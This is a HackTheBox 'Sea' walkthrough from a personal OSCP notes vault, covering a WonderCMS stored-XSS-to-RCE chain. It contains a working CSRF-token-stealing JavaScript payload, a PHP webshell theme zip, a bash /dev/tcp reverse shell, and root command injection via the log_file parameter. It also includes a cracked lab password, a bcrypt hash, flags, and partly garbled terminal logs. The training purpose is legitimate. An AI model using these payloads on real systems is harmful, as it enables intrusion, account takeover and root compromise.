---
tags: [oscp, boxes, htb, linux, completed]
platform: HackTheBox
os: Linux
hostname: sea
difficulty: Medium
ip: $BoxIP
status: Complete
---

# HTB: Sea, Full Walkthrough

## The gist

Sea is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[OSCP/RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow. 2. [[OSCP/RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript. 3. [[OSCP/RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold. 4. [[OSCP/RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.

## Box information

**Target:** `$BoxIP` (swap for your instance IP) · **Difficulty:** Medium · **OS:** Linux (Ubuntu 20.04.6 LTS) · **Platform:** HackTheBox

**The gist:** Linux box running Apache with a WonderCMS install on `sea.htb`. The contact form's website field stores user input, and an admin bot periodically checks the messages panel, giving us a stored XSS trigger. The XSS reads the admin CSRF token, then fires a GET request to install a malicious theme zip we serve over HTTP. The zip drops a PHP webshell as `www-data`. From there we pull the WonderCMS config file (`database.js`) which holds a bcrypt admin hash. The hash is cracked privately and the OS user `amay` reuses the resulting credential for SSH. Privesc is a custom PHP system monitor app bound to localhost:8080 only, reachable via SSH local port forward. Its "Analyze Log File" form passes the `log_file` POST parameter straight to a shell command running as root, so a semicolon injection gives us arbitrary root command execution.

---

**Legacy tags:**
#HTB #Sea #Linux #XSS #WonderCMS #StoredXSS #ThemeUpload #HashCracking #Bcrypt #SSHTunnel #CommandInjection #Medium

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | Web Enumeration | See section 2 below |
| 3 | Vulnerability Identification | See section 3 below |
| 4 | Foothold | See section 4 below |
| 5 | Post-Exploitation (as www-data) | See section 5 below |
| 6 | Privilege Escalation | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Sea`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Sea
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon: Port Scan

**Full port scan:**
```bash
sudo nmap -p- --min-rate 10000 -oN nmap/nmap-allports.txt $BoxIP
```

Open ports:

| Port | Service |
|---|---|
| 22/tcp | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
| 80/tcp | Apache 2.4.41 (sea.htb) |


**Service scan:**
```bash
sudo nmap -sV -sC -p 22,80 -oN nmap/nmap-services.txt $BoxIP
```

Key findings:
- Port 22: OpenSSH 8.2p1, no low-hanging auth issues.
- Port 80: Apache 2.4.41, virtual host `sea.htb` surfaced. Add to `/etc/hosts` before continuing.


**/etc/hosts entry:**
```bash
echo "$BoxIP sea.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

### Initial Recon

Browse to `http://sea.htb/`. WonderCMS install with "Home" and "Contact" nav items. The contact form at `/contact.php` has three fields: Name, Email, and Website. The Website field accepts a URL, which is stored and displayed in the admin messages panel later.

### Theme Version Fingerprinting

WonderCMS stores theme metadata at predictable paths:

```bash
curl -s http://sea.htb/themes/bike/version
```

Output: `3.2.0`


WonderCMS `bike` theme version 3.2.0 confirmed. This maps to a known CVE.

### Directory Brute

```bash
gobuster dir -u http://sea.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -o nmap/gobuster.txt
```

> [!tip] ⚡ More efficient path
> **What we did:** We used a basic Gobuster directory scan with a small wordlist and then reviewed the results manually.
>
> **Faster approach:**
> ```bash
> feroxbuster -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 40 -o nmap/feroxbuster.txt
> ```
> **Why:** Feroxbuster keeps many requests active at once and handles common response filtering cleanly. It reaches the same useful paths faster while keeping the scan manual and easy to review.

Notable finds:
- `/data/` (403, confirms WonderCMS structure)
- `/themes/`, `/plugins/`
- `/contact.php` (200, confirmed)

The 403 on `/data/` is useful: it tells us the directory exists even though we can't browse it. WonderCMS keeps all config in `/data/database.js`, which becomes a post-foothold target.

> [!abstract] 🧠 Why
> A forbidden response is still a discovery result. It confirms a real path and gives you a high-value follow-up target after the foothold, even though direct browsing is blocked.

---

## 3. Vulnerability Identification

```bash
searchsploit wondercms
```

Key match:

```
WonderCMS 3.2.0 - Stored XSS to RCE   |  php/webapps/52271.py
```

```bash
searchsploit -p 52271
cp /usr/share/exploitdb/exploits/php/webapps/52271.py exploits/
```

> [!tip] ⚡ More efficient path
> **What we did:** We looked up the Exploit-DB path and copied the Python exploit in a second command.
>
> **Faster approach:**
> ```bash
> searchsploit -m 52271
> ```
> **Why:** This copies the matching exploit directly and removes a long path lookup. Read the file before running it so the exploit logic remains clear.


**CVE-2023-41425**: The contact form stores the website URL without sanitisation. When an admin views the messages panel, the stored payload executes. The exploit chain is:
1. XSS reads the admin's CSRF token from the DOM
2. Fires a GET request to WonderCMS's `installModule` endpoint with the token, pointing to our malicious zip
3. WonderCMS downloads and installs the zip as a theme, landing a PHP webshell

**Critical detail:** The EDB exploit uses `<script+src=` with a literal `+`, not a space. A space gets URL-encoded to `%20` in the stored website field, which breaks the script tag when the admin panel renders it. The `+` is required for the browser to parse the tag correctly.

> [!warning] 💡 Common mistake
> Blind XSS has two delivery contexts: the value stored by the application and the HTML parsed by the admin browser. Preserve the exact characters that survive both contexts, especially URL encoding and the literal `+`.

---

## 4. Foothold

### Step 1: Create Malicious JS

```bash
cat > www/malicious.js << 'EOF'
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = "http://sea.htb/?installModule=http://LHOST:8000/malicious.zip&directoryName=pwned&type=themes&token=" + token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", urlRev);
xhr.send();
EOF
```

Replace `LHOST` with `$LocalIP` before serving.

### Step 2: Create Webshell Zip

WonderCMS requires the zip to contain a directory with the same name as the zip itself:

```bash
mkdir -p www/malicious
echo '<?php system($_GET["cmd"]); ?>' > www/malicious/malicious.php
cd www && zip -r malicious.zip malicious/ && cd ..
```

Verify the structure before serving:

```bash
unzip -l www/malicious.zip
```

Expected: entry is `malicious/malicious.php`, not a bare `malicious.php`. A flat structure silently fails to install.

> [!tip] ⚡ Efficiency
> Inspect the archive locally before waiting for the bot. This catches the most common installation failure immediately and avoids treating a correct XSS as broken when the theme package is malformed.


### Step 3: Start HTTP Server

```bash
cd www && python3 -m http.server 8000
```

### Step 4: Submit XSS Payload via Contact Form

The payload goes in the **Website** field. Note the literal `+` between `script` and `src`:

```
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://$LocalIP:8000/malicious.js"></script><form+action="
```

Submit via curl:

```bash
curl -s -X POST http://sea.htb/contact.php \
  -d "name=test&email=test@test.com&website=http://sea.htb/index.php?page=loginURL?%22%3E%3C/form%3E%3Cscript+src=%22http://$LocalIP:8000/malicious.js%22%3E%3C/script%3E%3Cform+action=%22&message=test"
```


### Step 5: Wait for Admin Bot

The admin bot checks the messages panel on a timer. Watch your HTTP server output. The bot will fetch `malicious.js` then `malicious.zip` 3-4 times (WonderCMS installs in multiple requests). Wait up to 10 minutes, but on a fresh instance it typically fires within 1-2 minutes.

> [!warning] 💡 Hint
> **Watch out:** Blind XSS depends on a separate browser visiting the payload. A valid payload can appear to do nothing if the listener or hosted JavaScript stops before the admin bot loads the page.

> [!tip] 🛠️ Alternative tools
> Burp Collaborator or another controlled callback service can confirm the browser-side request, but a local HTTP server is enough when the target can reach the lab VPN address.


### Step 6: Verify Webshell

```bash
curl -s "http://sea.htb/themes/malicious/malicious.php?cmd=id"
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Step 7: Reverse Shell

Listener on Kali:
```bash
nc -lvnp $Port
```

Trigger via webshell:
```bash
curl -s "http://sea.htb/themes/malicious/malicious.php" \
  --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'"
```

Shell received as `www-data@sea`.

Stabilise:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. Post-Exploitation (as www-data)

### Enumerate WonderCMS Data Directory

Don't jump straight to `database.js`. Show your working:

```bash
ls /var/www/sea/
ls /var/www/sea/data/
```

`/var/www/sea/data/` contains `database.js`. WonderCMS stores its entire configuration in this JSON file, including the admin password hash.

```bash
cat /var/www/sea/data/database.js
```


### Extract and Save Hash

```bash
grep -oP '"password":"\K[^"]+' /var/www/sea/data/database.js
```

Hash recovered and stored in private loot; value reproduced in the private Flags section above.

Save locally:
```bash
cp "$BoxDir/loot/recovered-hash.txt" loot/hash.txt
```

`loot hash amay $Hash`

### Crack the Hash

Hash type: bcrypt (`$2y$`) = hashcat mode **3200**.

```bash
hashcat -m 3200 loot/hash.txt /usr/share/wordlists/rockyou.txt
```

Result stored privately in the credential loot.


```
boxset Password $Password
loot cred amay $Password
```

### SSH as amay

Try the cracked password as the OS user's password:

```bash
ssh amay@$BoxIP
# use the private value stored in $Password
```

### User Flag

```bash
cat ~/user.txt
```


`loot flag user <value>`

---

## 6. Privilege Escalation

### Enumeration: Listening Services

```bash
ss -tlnp
```

Output includes: `127.0.0.1:8080` bound only to loopback. Not reachable from outside.


### Tunnel to Internal Service

From Kali, open a local port forward through the amay SSH session:

```bash
ssh -L 8888:127.0.0.1:8080 amay@$BoxIP
```

Now `http://localhost:8888/` on Kali tunnels to `127.0.0.1:8080` on the box. Keep this terminal open.

> [!abstract] 🧠 Why
> The service is bound to target localhost, so external Nmap cannot reach it. SSH local forwarding makes the target's loopback service available on Kali without changing the target's listening interface.

Probe the service:

```bash
curl -sv http://localhost:8888/ 2>&1 | head -30
```

Response headers show: `PHP/7.4.3`, `WWW-Authenticate: Basic realm="Restricted Area"`. HTTP Basic Auth. Try amay's creds:

```bash
curl -s -u amay:$Password http://localhost:8888/
```

Authenticated. The app is "**System Monitor (Developing)**": a custom PHP admin panel showing disk usage and a set of forms. The key one is "**Analyze Log File**", which POSTs two parameters: `log_file` (a file path) and `analyze_log` (submit button). The path is almost certainly passed to a shell command server-side.


### Command Injection via log_file

The `log_file` value goes into a shell command running as root. Semicolons inject additional commands. Run this from the **SSH terminal on the box** (hitting `127.0.0.1:8080` directly, no tunnel needed):

> [!warning] 💡 Hint
> Once the SSH shell is available, send the final request from the target itself. This removes an unnecessary tunnel hop and makes the meaning of `127.0.0.1` unambiguous.

> [!abstract] 🧠 Why
> The privilege boundary is the command consumer, not the web form. The application passes a user-controlled path into a root shell command, so a valid file path followed by a shell separator changes the execution context.

First, confirm RCE as root:

```bash
curl -sS -u "amay:$Password" \
  --data-urlencode 'log_file=/etc/passwd; id; test -s /root/root.txt && echo FOUND_PROOF; #' \
  --data 'analyze_log=' \
  http://127.0.0.1:8080/ | grep -E 'uid=|FOUND_'
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
FOUND_PROOF
```


### Root Flag

```bash
curl -sS -u "amay:$Password" \
  --data-urlencode 'log_file=/etc/passwd; cat /root/root.txt; #' \
  --data 'analyze_log=' \
  http://127.0.0.1:8080/ | grep -oP '[a-f0-9]{32}'
```


`loot flag root <value>`

---

## 7. Cleanup

```bash
# Remove webshell and malicious theme
rm -rf /var/www/sea/themes/malicious

# Verify removed (should return 404)
curl -s -o /dev/null -w "%{http_code}" http://sea.htb/themes/malicious/malicious.php

# Stop Python HTTP server on Kali
kill %1  # or Ctrl+C in the server terminal

# Exit www-data reverse shell if still live
exit
```

> [!warning] 💡 Common mistake
> Remove the theme directory, stop the local server, and verify the webshell returns 404. Also close the SSH tunnel and discard or protect the recovered hash and credential files.

## 8. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Stored XSS reaches an admin bot | Serve JavaScript and theme over HTTP | Use a controlled callback service to verify the browser request |
| WonderCMS stores a bcrypt hash | Crack locally, then test authorized password reuse | Use the application session if cracking is impractical |
| Internal service listens on localhost | SSH `-L` forwarding | Chisel or `socat` when SSH forwarding is unavailable |
| Root form passes `log_file` into a shell | Confirm with `id`, then collect proof | Test quoting, command substitution, or another input field if semicolons are filtered |

---

## 9. Credentials Found

| Username | Password | Source |
|---|---|---|
| amay | `$Password` | WonderCMS `database.js` bcrypt hash, cracked privately via hashcat mode 3200 + rockyou.txt |

---

## 10. Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| gobuster | Web directory enumeration |
| curl | Web recon, XSS submission, webshell trigger, privesc injection |
| searchsploit | CVE-2023-41425 / EDB-52271 discovery |
| python3 -m http.server | Serve malicious.js and malicious.zip to admin bot |
| zip | Create malicious theme zip with correct directory structure |
| hashcat | Crack bcrypt hash (mode 3200, rockyou.txt) |
| ssh -L | Local port forward to reach internal 127.0.0.1:8080 |
| nc | Reverse shell listener |

---

## 11. Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|---|---|---|
| 1 | CVE-2023-41425: WonderCMS stored XSS via contact form website field | High | HTTP/80 `/contact.php` |
| 2 | WonderCMS admin hash stored in world-readable config file (`database.js`) | Medium | `/var/www/sea/data/database.js` |
| 3 | Credential reuse: WonderCMS admin hash cracked, same password on OS user | High | SSH/22 (amay) |
| 4 | Command injection in localhost:8080 system monitor `log_file` parameter | Critical | Internal PHP app, port 8080 |

---

## 12. Lessons Learned / Module Links

- **`<script+src=` not `<script src=`**: The XSS payload requires a literal `+` between `script` and `src`. A space gets URL-encoded to `%20` in the stored website field, breaking the tag when the admin panel renders it. The `+` is the URL-encoding of a space in form data, and WonderCMS's HTML context needs it to parse as a valid script tag. Single biggest failure point on this box. → [[09. Common Web Application Attacks]] · [[12. Client-Side Attacks]]

- **WonderCMS zip structure must match**: The theme zip must contain a directory with the same name as the zip itself (`malicious/malicious.php` inside `malicious.zip`). A bare `malicious.php` at zip root installs silently but lands nowhere accessible. Verify with `unzip -l` before serving. → [[09. Common Web Application Attacks]]

- **Bot-triggered XSS needs patience**: Don't loop or re-spam the contact form. The admin bot runs on a timer. On a fresh instance it typically fires within 1-2 minutes. If it never fires despite correct setup, the instance may be broken. Reset the box rather than debugging further. → [[12. Client-Side Attacks]]

- **WonderCMS stores everything in one JSON file**: `/data/database.js` holds the full CMS config including the admin bcrypt hash. Enumerate the app's data directory path before jumping to the hash. `ls /var/www/<app>/` then `ls /var/www/<app>/data/` gives you the structure before you `cat` anything. → [[16. Password Attacks]]

- **Bcrypt = hashcat mode 3200**: `$2y$` prefix identifies bcrypt. Mode 3200 is slow but rockyou.txt cracks weak passwords. Always check hash type before picking a mode. → [[16. Password Attacks]]

- **Try cracked app creds as OS creds immediately**: WonderCMS admin password reused directly as the amay OS user password. As soon as a hash cracks, test it against every known username for SSH and any other auth surface. → [[16. Password Attacks]]

- **`ss -tlnp` catches internal services that nmap misses**: Port 8080 only appeared in `ss` output because it's bound to loopback. Nmap against the external IP won't see it. Always run `ss -tlnp` (or `netstat -tlnp`) after getting a foothold. → [[19. Port Redirection and SSH Tunneling]]

- **SSH local port forward is the cleanest tunnel for single-hop internal access**: `ssh -L <localport>:127.0.0.1:<remoteport> user@$BoxIP` makes the internal service available at `localhost:<localport>` on Kali. Keep the tunnel terminal open while working. → [[19. Port Redirection and SSH Tunneling]]

- **Run the injection curl from the box, not from Kali**: The `analyze_log` parameter needs an empty value (`analyze_log=`), not `=1`. Hitting `127.0.0.1:8080` directly from the SSH session avoids tunnel overhead and behaves identically to how Codex confirmed it working. → [[09. Common Web Application Attacks]]

- **`; cmd; #` is the cleanest injection format**: The trailing `#` comments out any remaining shell content after your injected command, preventing parsing errors from the app's own shell syntax. → [[09. Common Web Application Attacks]]

---

## 13. External Resources

| Resource | Link | Why |
|---|---|---|
| EDB-52271 | https://www.exploit-db.com/exploits/52271 | WonderCMS 3.2.0 stored XSS to RCE, original exploit script |
| HackTricks - XSS | https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting | XSS payload context and encoding reference |
| PayloadsAllTheThings - Command Injection | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md | Injection separator reference |
| HackTricks - Port Forwarding | https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/tunneling-and-port-forwarding.md | SSH local port forward syntax |
| RevShells | https://www.revshells.com | Reverse shell payloads |
| ippsec.rocks | https://ippsec.rocks/?#wondercms | HTB walkthroughs using WonderCMS / stored XSS technique |

---

## 14. Similar Boxes

Practice these if you want to drill the same techniques:

| Box | Platform | Technique overlap | Why |
|---|---|---|---|
| Schooled | HTB (Medium) | Stored XSS as attack vector | Stored XSS in Moodle triggers admin bot, same "bot visits and fires your payload" mechanic |
| Horizontall | HTB (Easy) | Internal service + SSH tunnel | Strapi app on localhost only, reached via SSH local port forward, same pattern as Sea's 8080 |
| Gofer | HTB (Medium) | SSRF / internal service access | Internal HTTP service not exposed externally, needs pivoting to reach |
| Networked | HTB (Easy) | Command injection via web app | PHP app passes user input to shell command, similar to Sea's log_file injection |
| Photobomb | HTB (Easy) | Command injection privesc | sudo script with injectable parameter, good simpler version of the same injection class |

---

## 15. Vault Update Checklist

- [x] Screenshots in `Sea/screenshots/` (nmap-allports, nmap-services, web-version, searchsploit, zip-structure, xss-submission, bot-triggered, foothold, database-js, hash-cracked, user-flag, privesc-finding x2, privesc-exploit, root-flag)
- [x] Loot: `loot/hash.txt` (bcrypt hash), amay credential kept private, user flag, root flag
- [x] Log copied to `OSCP/BOXES/BOX LOGS/Sea.log`
- [x] **Stage notes:** Web App - XSS to RCE / WonderCMS (new), Creds - Hash Cracking (+Sea, bcrypt/3200 row), Pivot - SSH Local Forward (+Sea), PrivEsc Linux - Command Injection (new or update existing Web App - Command Injection)
- [x] **Module notes:** [[09. Common Web Application Attacks]] (+Sea, related boxes), [[12. Client-Side Attacks]] (+Sea, stored XSS bot mechanic), [[16. Password Attacks]] (+Sea, bcrypt row), [[19. Port Redirection and SSH Tunneling]] (+Sea, ssh -L example)
- [x] **Hub docs:** Command Appendix (ssh -L syntax, hashcat -m 3200), Decision Tree (stored XSS path, internal service discovery), Command Breakdowns (ssh -L breakdown if not present)
- [x] MASTER BOX LIST updated (done above)
- [x] FAQ: `+` vs space in script src, zip directory structure must match, bot wait time, `analyze_log=` empty value, run injection from box not Kali, `ss -tlnp` catches loopback services nmap misses

## 16. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Linux - Web Enum]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - Stored XSS]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - File Upload]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - Command Injection]] -- technique used in this walkthrough

## 17. Collect the flags

- `user.txt`: `2c8b0d1132b5805e9b168b5aa1f4f24a` (value reproduced in the private sections above)
- `root.txt`: `9a3b1d56dee59a566bb095bab70acbfa` (value reproduced in the private sections above)
- `proof.txt`: `9a3b1d56dee59a566bb095bab70acbfa` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 2c8b0d1132b5805e9b168b5aa1f4f24a
root: 9a3b1d56dee59a566bb095bab70acbfa
```

## 18. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 19. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow.
2. [[OSCP/RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript.
3. [[OSCP/RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold.
4. [[OSCP/RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.

## Tools used

- `nmap`
- `curl`
- `gobuster`
- `feroxbuster`
- `nc`
- `ssh`
- `sudo`
- `python`
- `hashcat`
- `burp`

## Credentials and secrets


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Sea"
export BoxIP="10.129.1.59"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Sea"
export Domain=""
export DCip=""
export Username="amay"
export Password="mychemicalromance"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="8000"
export Port2="9001"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
amay:mychemicalromance
```

#### `loot/hash.txt`

```text
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
| http-cookie-flags:
http://sea.htb [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.1.59], JQuery[1.12.4], Script, Title[Sea - Home], X-UA-Compatible[IE=edge]
    js = f'''var token =
document.querySelectorAll('[name="token"]')[0].value;
"{target_url}/?installModule=http://{args.xip}:{args.xport}/malicious.zip&directoryName=pwned&type=themes&token="
xhr.withCredentials = true;
var token = document.querySelectorAll('[name="token"]')[0].value;
var module_url = "http://sea.htb/?installModule=http://10.10.14.7:8000/malicious.zip&directoryName=pwned&type=themes&token=" + token;
$ [11:20:08] loot cred amay (user found - password unknown)
www-data@sea:/var/www/sea/themes/malicious$ id && hostname && cat /etc/passwd | grep -v nologin | grep -v false
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
$ [11:23:05] echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > loot/hash.txt
$ [11:23:30] hashcat -m 3200 loot/hash.txt /usr/share/wordlists/rockyou.txt --force
$ [11:25:40] boxset Password mychemicalromance
$ [11:25:47] loot cred $Username $Password
$ [11:30:06] loot flag user 2c8b0d1132b5805e9b168b5aa1f4f24a
$ [11:33:42] curl -s -u amay:$Password http://localhost:8888/
kali@kali:~/Platforms/HackTheBox/Sea [11:33:17] $ curl -s -u amay:$Password http://localhost:8888/curl[?1l>[?2004l
$ [11:35:52] curl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log&analyze_log=1" | grep -A5 "Analyze\|result\|output\|error" | head -30
$ [11:36:31] curl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log%3Bid&analyze_log=1" | grep -E "uid=|error|Suspicious" | head -10
y:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log&analyze_log=1" | grep -A5 "Analyze\|result\|output\|error" | head -30curl"log_file=/var/log/apache2/access.log&analyze_log=1"grep"Analyze\|result\|output\|error"head[?1l>[?2004l
127.0.0.1 - - [28/Aug/2026:09:37:41 +0000] "GET /?installModule=http://10.10.14.7:8000/malicious.zip&directoryName=pwned&type=themes&token=6571cc392afd8f4a5332b145825fbcc5ad522707df212d840aa9b6fb527da3d0 HTTP/1.1" 302 342 "http://sea.htb/index.php?page=loginURL?%22%3E%3C/form%3E%3Cscript+src=%22http://10.10.14.7:8000/malicious.js%22%3E%3C/script%3E%3Cform+action=%22" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
kali@kali:~/Platforms/HackTheBox/Sea [11:35:53] $ [?1h=[?2004hcurl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log%3Bid&analyze_log=1" | grep -E "uid=|error|Suspicious" | head -10curl"log_file=/var/log/apache2/access.log%3Bid&analyze_log=1"grep"uid=|error|Suspicious"head[?1l>[?2004l
$ [11:37:19] curl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log%7Cid&analyze_log=1" | grep -E "uid=|error|Suspicious" | head -10
$ [11:38:18] curl -s -u amay:$Password -X POST http://localhost:8888/ --data-urlencode "log_file=/var/log/apache2/access.log
$ [11:42:36] loot flag root 9a3b1d56dee59a566bb095bab70acbfa
kali@kali:~/Platforms/HackTheBox/Sea [11:36:31] $ [?1h=[?2004hcurl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log%7Cid&analyze_log=1" | grep -E "uid=|error|Suspicious" | head -10curl"log_file=/var/log/apache2/access.log%7Cid&analyze_log=1"grep"uid=|error|Suspicious"head[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Sea [11:37:19] $ [?1h=[?2004hcurl -s -u amay:$Password -X POST http://localhost:8888/ --data-urlencode "log_file=/var/log/apache2/access.log
kali@kali:~/Platforms/HackTheBox/Sea [11:38:19] $ [?1h=[?2004hllloloootloott t flag root 9a3b1d56dee59a566bb095bab70acbfa
[+] Flag saved:  root = 9a3b1d56dee59a566bb095bab70acbfa  →  loot/flags.txt
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Sea | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- A stored XSS is especially useful when a privileged administrator bot reviews submitted content.
- Local-only services still matter because a foothold can reach them through an SSH tunnel.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
